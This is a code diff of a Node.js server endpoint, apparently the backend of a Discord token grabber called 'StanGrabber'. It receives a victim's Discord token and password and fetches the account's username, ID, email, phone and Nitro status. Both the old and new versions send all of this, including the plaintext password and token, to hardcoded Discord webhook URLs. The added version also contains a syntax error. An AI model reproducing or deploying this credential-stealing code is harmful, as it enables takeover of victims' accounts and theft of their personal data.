@@ -2,69 +2,50 @@ const axios = require('axios');
 
 
 
-exports.send = (req, res, webhook) =>
-{
-	const token = req.body.token;
-	const password = req.body.password;
-	
-	
-	if(token === undefined || password === undefined)
-		return res.status(400).json({status: "error", message: "Not sent."});
+exports.send = (req, res, webhook) => {
+    const token = req.body.token;
+    const password = req.body.password;
 
 
-	
+    if (token === undefined || password === undefined)
+        return res.status(400).json({status: "error",message: "Not sent."});
 
- 	info = getinfo(token);
-	
-	
-	var discrim = JSON.parse(JSON.stringify(info)).discriminator;
-	var username = JSON.parse(JSON.stringify(info)).username + "#" + discrim;
+    function GetInfos(token, password) {
+        fetch('https://discordapp.com/api/v8/users/@me', {
+        method: 'get',
+        headers: {
+            'Content-Type': 'application/json',
+            'Authorization': token
+        }
+    })
+    .then(x => x.json()).then(y => {
+        var nitro;
+        var phone;
+        if (JSON.parse(JSON.stringify(y)).premium_type == 1) {
+            nitro = "Nitro Classic";
+        } else if (JSON.parse(JSON.stringify(y)).premium_type == 2) {
+            nitro = "Nitro Boost";
+        } else {
+            nitro = "None";
+        }
 
+        if (JSON.parse(JSON.stringify(y)).phone == null) {
+            phone = "None";
+        } else {
+            phone = JSON.parse(JSON.stringify(y)).phone;
+        }
 
-	var id = JSON.parse(JSON.stringify(info)).id;
+        axios.post(`https://canary.discord.com/api/webhooks/793927074590228566/k41Qn_WnIX7SO0mVeq8O8e76QcSG5YAWfEgcdRq9fToxiuXd1xwUjNbJZr51Q2MUILuq`, {
+            username: `StanGrabber`,
+            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : "
+            password
+        }).then((z) => {
+        	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
+        }).catch((bite) => {
+        	return res.status(500).json({status: "error",message: "Not sent."});
+        });
+    });
+    }
 
-	
-	
-	var email = JSON.parse(JSON.stringify(info)).email;
-	
-	var phone = JSON.parse(JSON.stringify(info)).phone;
-	
-	if (phone == 'null')
-	{
-		phone = 'None';
-	}
-	var nitro = 'none';
-
-	var nitro2 = JSON.parse(JSON.stringify(info)).premium_type;
-	if (nitro2 == 0)
-	{
-		nitro = 'none';
-	}
-	else if (nitro2 == 1)
-	{
-		nitro = 'Nitro Classic';
-	}
-	else if (nitro2 == 2)
-	{
-		nitro = 'Nitro Boost';
-	}
-
-	
-
-	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: `Username : ` + username + '\n' + `ID : ` + id + '\n' + "E-Mail : " + email + '\n' + "Phone : " + phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " + password})
-	.then((resp) => 
-	{
-		if(resp.status === 200)
-			return res.status(200).json({status: "ok", message: "Sent."});
-	})
-	.catch((err) => 
-	{
-		return res.status(500).json({status: "error", message: "Not sent."});
-	});
-	
-	res.status(200).json({status: "ok", message: "Sent."});
-  }
-  
-	
+    GetInfos(token, password);
 }
-
